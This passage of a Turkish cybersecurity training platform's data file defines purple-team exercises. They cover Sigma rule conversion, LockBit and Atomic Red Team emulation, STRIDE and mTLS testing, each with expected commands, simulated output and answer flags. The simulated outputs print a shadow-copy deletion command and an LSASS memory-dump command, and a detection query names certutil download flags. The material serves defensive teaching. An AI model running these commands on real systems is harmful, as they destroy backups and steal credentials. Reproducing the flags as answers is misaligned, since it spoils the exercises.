        "title": "Algılama Mühendisliği (Detection Engineering): Sigma & YARA",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "DETECTION ENGINEERING & SIGMA",
        "theory": "### Saldırıyı Kurala Dönüştürmek: Tespit Mühendisliği\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nTüm dünyada geçerli olan bir para basım şablonudur. Bir kez \"Sahte para nasıl anlaşılır\" kuralını (Sigma) yazarsınız; ister Türk Lirası ister Dolar sayma makinesi olsun kuralı anında o makineye uyarlayıp çalıştırırsınız.\n\nRed Team bir zafiyet bulup içeri girdiğinde ya da yeni bir bypass yöntemi denediğinde, Purple Team analisti bunu inceler ve savunmaya **kalıcı bir kural** yazar.\n\n#### 1. Sigma Kuralları:\nSigma, SIEM dünyasının ortak dilidir. Bir kere YAML formatında kural yazarsınız; bunu Splunk, Elastic veya Sentinel dillerine dönüştürebilirsiniz.",
        "mission": "Hazırlanan certutil Sigma tespit kuralını Splunk arama sorgusuna derleyen dönüştürücü komutunu çalıştırın.",
        "expectedCommand": "sigmac -t splunk rules/certutil_download.yml",
        "acceptedCommands": [
            "sigmac -t splunk -c sysmon rules/certutil_download.yml",
            "sigmac rules/certutil_download.yml",
            "sigmac -t splunk rules/certutil.yml"
        ],
        "hintExplanation": "<p><strong>sigmac:</strong> Sigma Kural Derleyicisidir (Sigma Compiler). Ortak kural şablonlarını farklı SIEM dillerine çevirir.</p>\n<p><strong>-t splunk:</strong> Çıktının Splunk arama dili (SPL) formatında olmasını sağlar.</p>\n<p><strong>rules/certutil_download.yml:</strong> Yazdığımız genel kural dosyasıdır; derlendiğinde doğrudan Splunk SIEM alarmına dönüşür.</p>",
        "terminalSuccessOutput": "[SIGMA CONVERTER v0.22]\nHedef SIEM Motoru: Splunk (Sysmon Parser)\nÜretilen SPL Sorgusu:\nindex=sysmon EventCode=1 Image=\"*\\\\certutil.exe\" (CommandLine=\"*-urlcache*\" OR CommandLine=\"*-split*\")\n[KURAL BAŞARIYLA DERLENDİ]: Korelasyon motoru kuralı aktif edildi.\n[FLAG] LFL{detection_engineering_sigma_to_splunk}",
        "flag": "LFL{detection_engineering_sigma_to_splunk}",
        "nextId": "purple-302"
    },
    {
        "id": "purple-302",
        "track": "purple",
        "title": "Siber Tehdit İstihbaratı (CTI) & Tehdit Odaklı Simülasyon",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "CTI & THREAT-INFORMED DEFENSE",
        "theory": "### Tehditten Bir Adım Önde: CTI Odaklı Savunma\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nHava durumu raporuna bakıp \"Yarın fırtına çıkacak\" haberini önceden alarak, fırtına kapıya dayanmadan çatıyı ve pencereleri onarmaktır (Tehdit İstihbaratı Odaklı Savunma).\n\nEn üst seviye Purple Team çalışması, kurumun sektörüne saldıran gerçek dünyadaki aktörleri inceleyerek proaktif tatbikat yapmaktır.\n\n#### 1. CTI Veri Akışları & TTPs:\nDavid Bianco'nun Ağrı Piramidi: Saldırganın IP'sini değiştirmek 1 saniye sürer, ancak saldırı alışkanlığını ve taktiklerini değiştirmek aylar alır.",
        "mission": "Gelen CTI raporundaki yeni LockBit fidye yazılımının gölge kopya silme (T1490) tekniğini test ederek kalkanı doğrulayın.",
        "expectedCommand": "python3 cti_emulator.py --threat LockBit --ttp T1490",
        "acceptedCommands": [
            "lfl-cti-emulate --threat 'LockBit-3.0' --ttp T1490 --engine wmi",
            "cti-emulate LockBit",
            "python3 cti_emulator.py"
        ],
        "hintExplanation": "<p><strong>python3 cti_emulator.py:</strong> Gelen istihbarat raporlarını canlı teste dönüştüren doğrulama betiğidir.</p>\n<p><strong>--threat LockBit:</strong> Kurumları hedef alan LockBit fidye yazılımı tehdit profilini seçer.</p>\n<p><strong>--ttp T1490:</strong> 'Inhibit System Recovery' tekniğidir (Windows yedeklerinin silinmesi). EDR ve yedekleme sistemlerinin bu saldırıyı durdurabildiği teyit edilir.</p>",
        "terminalSuccessOutput": "[CTI EMULATION ENGINE]\nHedef Tehdit Profili: LockBit 3.0 / Ransomware Operator\nSimüle Edilen Komut: wmic shadowcopy delete /nointeractive\n[TEST DENETİMİ]:\n-> EDR Engelleme: BAŞARILI (Tampon belleğe müdahale edildi)\n-> SOC Alarmları: High Severity 'WMI Shadow Copy Deletion' üretildi.\n[DURUM]: Şirket savunması LockBit 3.0 varyantına karşı %100 dirençli.\n[FLAG] LFL{cti_threat_informed_defense_validated}",
        "flag": "LFL{cti_threat_informed_defense_validated}",
        "nextId": "purple-303"
    },
    {
        "id": "purple-303",
        "track": "purple",
        "title": "Saldırı Simülasyonu: Atomic Red Team ile T1059 Tatbikatı",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "ATOMIC RED TEAM T1059 SIMULATION",
        "theory": "### Güvenliği Birim Test Mantığıyla Doğrulamak: Atomic Red Team\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBinadaki yangın alarmının düğmesine bilerek basıp 'Bakalım sirenler çalacak mı, itfaiyeye sinyal gidecek mi?' diye tatbikat yapmaktır. Binayı yakmazsınız, sadece alarmın çalışıp çalışmadığını 10 saniyede test edersiniz.\n\n#### MITRE T1059.001 (PowerShell İcrası):\nAtomic Red Team, PowerShell üzerinden base64 kodlu şüpheli bir komut çalıştırır. Purple Team'in görevi: Blue Team'in SIEM/EDR konsolunda bu eylemin anında 'Yüksek Tehdit' olarak düşüp düşmediğini teyit etmektir.",
        "mission": "PowerShell komut çalıştırma tekniğini atomik birim testi olarak simüle etmek için Invoke-AtomicTest T1059.001 -TestNumbers 1 komutunu çalıştırın.",
        "expectedCommand": "Invoke-AtomicTest T1059.001 -TestNumbers 1",
        "acceptedCommands": [
                "Invoke-AtomicTest T1059.001 -TestNumbers 1",
                "Invoke-AtomicTest T1059.001",
                "Invoke-AtomicTest 'T1059.001' -TestNumbers 1"
        ],
        "hintExplanation": "<p><strong>Invoke-AtomicTest:</strong> Red Canary tarafından geliştirilen açık kaynaklı BAS (Breach and Attack Simulation) PowerShell modülüdür.</p><p><strong>T1059.001:</strong> MITRE ATT&CK PowerShell yürütme tekniğidir.</p>",
        "terminalSuccessOutput": "PathToEngine: C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicTest.ps1\nExecuting test: T1059.001-1 Mimikatz / Encoded Command Execution Simulation\n[+] Atomic Test Executed Safely.\n[SIEM DOĞRULAMASI] Event ID 4104 (Script Block Logging) SIEM'e düştü!\n[EDR DURUMU] Alarm üretildi: 'Suspicious Encoded PowerShell Invocation'\n[FLAG] LFL{purple_atomic_red_t1059_powershell_verified}",
        "flag": "LFL{purple_atomic_red_t1059_powershell_verified}",
        "nextId": "purple-304"
},
    {
        "id": "purple-304",
        "track": "purple",
        "title": "Saldırı Simülasyonu: T1003 LSASS Credential Dump Doğrulama",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "BAS CREDENTIAL DUMP VALIDATION",
        "theory": "### Parola Çekmecesinin Güvenlik Testi: T1003 Doğrulama\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBanka müdürünün, güvenlik görevlisini test etmek için kasanın kapısını gizlice zorlaması gibidir. Görevli anında silahını çekip 'Dur!' derse tatbikat başarılıdır; uyumaya devam ederse sistemde büyük bir açık vardır.\n\n#### T1003.001 Testi:\nLSASS prosesine `OpenProcess` çağrısıyla okuma isteği atılır. Eğer EDR bunu bloklarsa test 'Engellendi (Blocked)' olarak işaretlenir; eğer bellek dökülürse Purple Team savunma kuralını derhal günceller.",
        "mission": "LSASS bellek erişimini atomik testle simüle edip EDR tepkisini doğrulamak için Invoke-AtomicTest T1003.001 -TestNumbers 2 komutunu çalıştırın.",
        "expectedCommand": "Invoke-AtomicTest T1003.001 -TestNumbers 2",
        "acceptedCommands": [
                "Invoke-AtomicTest T1003.001 -TestNumbers 2",
                "Invoke-AtomicTest T1003.001",
                "Invoke-AtomicTest 'T1003.001' -TestNumbers 2"
        ],
        "hintExplanation": "<p><strong>T1003.001:</strong> MITRE ATT&CK OS Credential Dumping: LSASS Memory tekniğidir.</p><p><strong>-TestNumbers 2:</strong> Comsvcs.dll MiniDump simülasyonunu çalıştırır.</p>",
        "terminalSuccessOutput": "Executing test: T1003.001-2 Dump LSASS.exe Memory using comsvcs.dll\nExecuting: rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 648 C:\\temp\\lsass.dmp full\n[EDR ENGELİ] Operation Blocked by Endpoint Protection (0xC0000022 - Access Denied)\n[KURAL DURUMU] LSASS koruma kuralı %100 başarıyla doğrulandı!\n[FLAG] LFL{purple_atomic_lsass_dumping_defense_validated}",
        "flag": "LFL{purple_atomic_lsass_dumping_defense_validated}",
        "nextId": "purple-305"
},
    {
        "id": "purple-305",
        "track": "purple",
        "title": "Tehdit Modellemesi: STRIDE Metodolojisi ile Tasarım Zırhlama",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "STRIDE THREAT MODELING",
        "theory": "### Kod Yazılmadan Önce Zafiyeti Öngörmek: STRIDE Analizi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir gökdelenin temelini atmadan önce mimari çizimini masaya yatırıp 'Bu bina 8 şiddetinde depreme dayanır mı? Yangın merdiveni nereye açılıyor?' diye hesap yapmaktır. İnşaat bittikten sonra hatayı düzeltmek 100 kat daha pahalıdır.\n\n#### STRIDE Kategorileri:\n* **S (Spoofing):** Sahte kimlikle sisteme girilebilir mi?\n* **T (Tampering):** Veri tabandaki veri değiştirilebilir mi?\n* **R (Repudiation):** 'Ben yapmadım' diye inkar edilebilir mi (Log var mı)?\n* **I (Info Disclosure):** Gizli veri dışarı sızabilir mi?\n* **D (Denial of Service):** Sunucu çökertilebilir mi?\n* **E (Elevation of Privilege):** Yetki yükseltilebilir mi?",
        "mission": "Sistem mimarisinin STRIDE tehdit değerlendirme raporunu üretmek için stride-cli evaluate --diagram architecture_v2.json komutunu çalıştırın.",
        "expectedCommand": "stride-cli evaluate --diagram architecture_v2.json",
        "acceptedCommands": [
                "stride-cli evaluate --diagram architecture_v2.json",
                "stride-cli evaluate architecture_v2.json",
                "stride evaluate --diagram architecture_v2.json"
        ],
        "hintExplanation": "<p><strong>stride-cli:</strong> Yazılım ve bulut mimari diyagramlarındaki potansiyel güvenlik açıklarını modelleyen analiz aracıdır.</p>",
        "terminalSuccessOutput": "[STRIDE ENGINE] Analyzing Data Flows, Trust Boundaries and Stores...\n[S] Spoofing: PASS (OAuth2 & JWT HMAC-SHA256)\n[T] Tampering: PASS (EF Core Parameterized Queries)\n[R] Repudiation: WARN (API DELETE endpoints missing central audit log)\n[I] Info Disclosure: PASS (Strict TLS 1.3 & Server Redaction)\n[D] DoS: PASS (Rate Limiting 100 req/min)\n[E] Elevation: PASS (RBAC Policy Enforcement)\n[RAPOR ONAYLANDI] Mimari tehdit modeli başarıyla çıkarıldı!\n[FLAG] LFL{purple_stride_threat_modeling_matrix_approved}",
        "flag": "LFL{purple_stride_threat_modeling_matrix_approved}",
        "nextId": "purple-306"
},
    {
        "id": "purple-306",
        "track": "purple",
        "title": "Boşluk Analizi: MITRE ATT&CK Navigator Isı Haritası",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "MITRE ATTACK HEATMAP & GAP ANALYSIS",
        "theory": "### Savunmanın Röntgeni: ATT&CK Navigator Isı Haritası\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir futbol antrenörünün elindeki taktik tahtasıdır. Sahayı bölgelere ayırır: 'Kalecimiz ve stoperlerimiz çok iyi (Yeşil renk), ancak sağ kanattan gelen kontrataklarda hiç kimse koşmuyor (Kırmızı renk)'. Kırmızı olan zafiyetli bölgelere acil takviye yapılır.\n\n#### Gap (Boşluk) Analizi:\nKurumun sahip olduğu kurallar MITRE matrisi üzerine bindirilir. Örneğin T1059 ve T1003 algılanıyorsa yeşil, ancak T1055 (Process Injection) tespit edilemiyorsa kırmızı yanar. Purple Team bu boşlukları tek tek kapatır.",
        "mission": "Kurumsal tespit kapsama haritasını derleyip ısı haritasını üretmek için attack-navigator --layer mitre_coverage_layer.json --render-heatmap komutunu çalıştırın.",
        "expectedCommand": "attack-navigator --layer mitre_coverage_layer.json --render-heatmap",
        "acceptedCommands": [
                "attack-navigator --layer mitre_coverage_layer.json --render-heatmap",
                "attack-navigator --layer mitre_coverage_layer.json",
                "attack-navigator --render-heatmap mitre_coverage_layer.json"
        ],
        "hintExplanation": "<p><strong>attack-navigator:</strong> MITRE ATT&CK tekniklerinin kapsama oranlarını görselleştiren resmi analiz aracıdır.</p>",
        "terminalSuccessOutput": "[+] Loading MITRE ATT&CK Enterprise Matrix v14.1\n[+] Mapping 184 enterprise techniques...\n[+] Techniques Covered (Green): 152 (82.6%)\n[+] Detection Gaps (Red): 32 (17.4%)\n[CRITICAL GAP FOUND] T1071.004 (DNS Tunneling) has NO active detection rule!\n[ISI HARİTASI OLUŞTURULDU] Boşluk analizi raporu /opt/purple/heatmap.svg olarak kaydedildi.\n[FLAG] LFL{purple_mitre_navigator_gap_coverage_heatmap_generated}",
        "flag": "LFL{purple_mitre_navigator_gap_coverage_heatmap_generated}",
        "nextId": "purple-307"
},
    {
        "id": "purple-307",
        "track": "purple",
        "title": "Zero-Trust Doğrulama: Mikrosegmentasyon & mTLS Testi",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "ZERO-TRUST & MTLS VALIDATION",
        "theory": "### İç Ağda Bile Güven Yok: Çift Taraflı Doğrulama (mTLS)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nKlasik web sitelerinde müşteri bankaya bakar ('Banka güvenli mi?'). mTLS'te ise banka da müşteriye 'Bana kendi parmak izli dijital sertifikanı sun' der. İki taraf da birbirini kriptografik olarak kanıtlamadan aralarında tek bir bayt bile akamaz.\n\n#### Mikrosegmentasyon Doğrulaması:\nRed Team web sunucusunu ele geçirse bile, veritabanına mTLS istemci sertifikası olmadan bağlanamaz. Purple Team istemci sertifikasının doğruluğunu ve yetkisiz erişimlerin reddedildiğini (HTTP 403 Forbidden) test eder.",
        "mission": "İstemci sertifikasını kullanarak korumalı kasa servisine mTLS doğrulamalı istek atmak için curl --cert client.crt --key client.key https://vault.internal/api/keys komutunu çalıştırın.",
        "expectedCommand": "curl --cert client.crt --key client.key https://vault.internal/api/keys",
        "acceptedCommands": [
                "curl --cert client.crt --key client.key https://vault.internal/api/keys",
                "curl --cert client.crt --key client.key https://vault.internal/api/keys -k",
                "curl https://vault.internal/api/keys --cert client.crt --key client.key"
        ],
        "hintExplanation": "<p><strong>--cert / --key:</strong> İstemcinin kendini sunucuya kanıtlamak için sunduğu kriptografik sertifika ve özel anahtardır.</p>",
        "terminalSuccessOutput": "HTTP/2 200 OK\nTLS-Session: TLS_AES_256_GCM_SHA384 (TLSv1.3)\nClient-Certificate-Validated: CN=authorized-analyst-node-01\nmTLS Handshake Status: VERIFIED\n{\n  \"status\": \"authorized\",\n  \"vault_access\": \"granted\",\n  \"zero_trust_policy\": \"enforced\"\n}\n[DOĞRULAMA TAMAM] mTLS mikrosegmentasyon kalkanı başarıyla doğrulandı!\n[FLAG] LFL{purple_zero_trust_mtls_microsegmentation_tested}",
        "flag": "LFL{purple_zero_trust_mtls_microsegmentation_tested}",
        "nextId": "purple-308"
},
    {
        "id": "purple-308",
        "track": "purple",
        "title": "Ortak Tehdit Avı: Zamanlanmış Görev Kalıcılık Avı",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "JOINT HUNTING & SCHEDULED TASKS",
        "theory": "### Kırmızı Bırakır, Mavi Avlar: Koordineli Tatbikat\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nEğitmen subayın kışlanın gizli bir yerine sahte bomba saklayıp, ardından arama kurtarma köpeğini ve askerleri kışlaya salarak bombayı ne kadar sürede bulacaklarını kronometreyle izlemesi gibidir.\n\n#### Kalıcılık Mekanizması (Persistence):\nRed Team sistemde her gece 03:00'da çalışacak gizli bir zamanlanmış görev (`Scheduled Task`) bırakır. Blue Team PowerShell cmdlet'leriyle görev tablosunu tarayarak şüpheli komutları ve bilinmeyen ikili dosyaları filtreleyip imha eder.",
        "mission": "PowerShell ile şüpheli TelemetryUpdate zamanlanmış görevini tespit etmek için Get-ScheduledTask | Where-Object {$_.TaskName -like '*TelemetryUpdate*'} komutunu çalıştırın.",
        "expectedCommand": "Get-ScheduledTask | Where-Object {$_.TaskName -like '*TelemetryUpdate*'}",
        "acceptedCommands": [
                "Get-ScheduledTask | Where-Object {$_.TaskName -like '*TelemetryUpdate*'}",
                "Get-ScheduledTask | Where-Object {$_.TaskName -like \"*TelemetryUpdate*\"}",
                "Get-ScheduledTask -TaskName '*TelemetryUpdate*'"
        ],
        "hintExplanation": "<p><strong>Get-ScheduledTask:</strong> Windows'taki tüm kayıtlı zamanlanmış görevleri çeker.</p><p><strong>Where-Object:</strong> Görev adında şüpheli kelime filtresi uygular.</p>",
        "terminalSuccessOutput": "TaskPath TaskName                 State\n-------- --------                 -----\n\\        TelemetryUpdateSystem    Ready\n  Actions: Executing C:\\ProgramData\\updater.exe -silent -beacon\n  Trigger: At 03:00 every day\n[TATBİKAT KANITI] Red Team tarafından bırakılan gizli arka kapı görevi 42 saniyede yakalandı!\n[MÜDAHALE] Görev silindi ve ikili dosya karantinaya alındı.\n[FLAG] LFL{purple_joint_exercise_scheduled_task_caught}",
        "flag": "LFL{purple_joint_exercise_scheduled_task_caught}",
        "nextId": "purple-309"
},
    {
        "id": "purple-309",
        "track": "purple",
        "title": "BAS Otomasyonu: Sürekli Güvenlik Doğrulama Pipeline'ı",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "AUTOMATED BAS & CI/CD PIPELINE",
        "theory": "### 7/24 Kesintisiz Güvenlik Testi: BAS Otomasyonu\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nOtomobil fabrikalarında üretilen her arabanın montaj bandından iner inmez otomatik robot kollarla fren testine, yağmur testine ve çarpışma simülasyonuna sokulması gibidir. İnsan yorulur ama otomatik test motoru asla uyumaz.\n\n#### Sürekli Güvenlik Doğrulama (Continuous Validation):\nBAS motoru her gece sanal test ortamında fidye yazılımı (Ransomware) ve Active Directory saldırı senaryolarını otomatik çalıştırır. Savunmada herhangi bir aksama olduğunda yazılımcılara ve SOC analistlerine sabah saat 08:00'da acil uyarı raporu gider.",
        "mission": "Active Directory Ransomware simülasyon senaryosunu otomatize BAS motoruyla çalıştırmak için bas-engine run --scenario 'ActiveDirectory-Ransomware-Simulation' komutunu çalıştırın.",
        "expectedCommand": "bas-engine run --scenario 'ActiveDirectory-Ransomware-Simulation'",
        "acceptedCommands": [
                "bas-engine run --scenario 'ActiveDirectory-Ransomware-Simulation'",
                "bas-engine run --scenario \"ActiveDirectory-Ransomware-Simulation\"",
                "bas-engine run ActiveDirectory-Ransomware-Simulation"
        ],
        "hintExplanation": "<p><strong>bas-engine:</strong> Kurumsal güvenlik doğrulamalarını senaryo bazlı otomatize eden test aracıdır.</p>",
        "terminalSuccessOutput": "[BAS ENGINE v3.8] Initializing Continuous Validation Pipeline...\n[*] Phase 1: Ingress Phishing Simulation -> BLOCKED by DMARC & WebFilter (100%)\n[*] Phase 2: Lateral Movement (Pass-the-Hash) -> BLOCKED by Protected Users (100%)\n[*] Phase 3: Mass File Encryption Attempt -> DETECTED by EDR Canary Trap in 140ms\n[PIPELINE STATUS] PASS: 18/18 Defense Tests Succeeded! Resilience Score: 98.4/100\n[FLAG] LFL{purple_continuous_bas_automated_validation_passed}",
        "flag": "LFL{purple_continuous_bas_automated_validation_passed}",
        "nextId": "purple-310"
},
    {
        "id": "purple-310",
        "track": "purple",
        "title": "Purple Team Zirvesi: Ortak Dayanıklılık & Yenilmez Savunma",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "PURPLE MASTERY & RESILIENCE VICTORY",
        "theory": "### Siber Güvenliğin Nirvana Noktası: Kırmızı ve Mavinin Zaferi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nİki kardeş dövüşçünün her gün ringe çıkıp birbirlerinin tüm açıklarını bulması, sonra sarılıp eksiklerini kapatması ve dünya şampiyonasına çıktıklarında hiçbir rakibin onları devirememesi gibidir. Kırmızı saldırır, Mavi savunur, Mor ise kurumu yenilmez yapar.\n\n#### 14 Purple Team Odasını Tamamladınız!\nMITRE ATT&CK eşlemesinden Atomic Red Team simülasyonlarına, STRIDE tehdit modellemesinden BAS otomasyonuna kadar hibrit operasyonları yönetebilen Baş Siber Mimarlık yetkinliğine eriştiniz.",
        "mission": "69 odalık devasa LFL Siber Akademi müfredatının nihai mor zafer belgesini okumak için cat /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt komutunu çalıştırın.",
        "expectedCommand": "cat /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt",
        "acceptedCommands": [
                "cat /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt",
                "cat PURPLE_TEAM_EXERCISE_VICTORY.txt",
                "more /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt"
        ],
        "hintExplanation": "<p><strong>PURPLE_TEAM_EXERCISE_VICTORY.txt:</strong> Tüm akademinin en son ve en prestijli mezuniyet bayrağıdır.</p>",
        "terminalSuccessOutput": "========================================================================\n🔮 TEBRİKLER! TÜM LFL SİBER AKADEMİ MÜFREDATINI TAMAMLADINIZ! 🔮\n========================================================================\n[TAMAMLANAN TOPLAM MÜFREDAT: 69 GÖREV ODASI]\n🌱 Starter Track: 18 Temel Giriş Odası (Ağ, Linux, CLI, chmod, Kripto)\n🔴 Red Team: 20 Görev Odası (Ofansif Pentest, Metasploit, AD, EDR Bypass, C2)\n🔵 Blue Team: 17 Görev Odası (SIEM, Snort, Sysmon, RAM Forensics, Sigma, IR)\n🟣 Purple Team: 14 Görev Odası (MITRE, Atomic BAS, STRIDE, Gap Analizi)\n\nArtık hem saldıranın aklını okuyan hem de savunanın kalkanını yöneten\nKıdemli bir Siber Güvenlik Mimarı ve Hibrit Güvenlik Liderisiniz!\n\n[NİHAİ MOR BAYRAK]: LFL{purple_team_joint_resilience_mastery_achieved}\n========================================================================",
        "flag": "LFL{purple_team_joint_resilience_mastery_achieved}",
        "nextId": "starter-01"
}

];
